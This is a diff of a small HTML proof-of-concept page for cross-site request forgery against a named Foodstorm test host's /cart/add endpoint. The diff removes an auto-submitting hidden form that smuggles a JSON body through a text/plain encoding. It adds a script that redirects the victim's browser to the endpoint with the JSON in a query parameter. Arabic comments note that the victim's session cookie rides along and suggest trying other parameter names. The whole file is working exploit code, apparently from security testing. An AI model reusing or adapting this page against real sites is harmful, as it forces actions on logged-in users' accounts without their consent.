@@ -1,18 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Top-Level Navigation CSRF - /cart/add</title>
-</head>
 <body>
-    <h2>Processing... Please wait.</h2>
-    
-    <form id="exploitForm" action="https://template.uat.foodstorm.com/cart/add" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"Item":"Test Vanilla Ice Cream","Quantity":7,"WeightRequiresConfirmation":false,"Pack":null,"PackSelection":"","options":null,"HasItemOptions":false,"Recommendation":{}}' value="">
-    </form>
-
     <script>
-        // الـ Submit ده هيحول الضحية لصفحة Foodstorm ويبعت الـ c_id معاها
-        document.getElementById("exploitForm").submit();
+        // تحويل الـ JSON لـ String وحطه في الـ URL كـ Parameter
+        const payload = '{"Item":"Test Vanilla Ice Cream","Quantity":7,"WeightRequiresConfirmation":false,"Pack":null,"PackSelection":"","options":null,"HasItemOptions":false,"Recommendation":{}}';
+        
+        // جرب تبعتها كـ query parameter اسمه 'data' أو 'item' أو حتى بدون اسم
+        window.location.href = "https://template.uat.foodstorm.com/cart/add?data=" + encodeURIComponent(payload);
     </script>
 </body>
 </html>
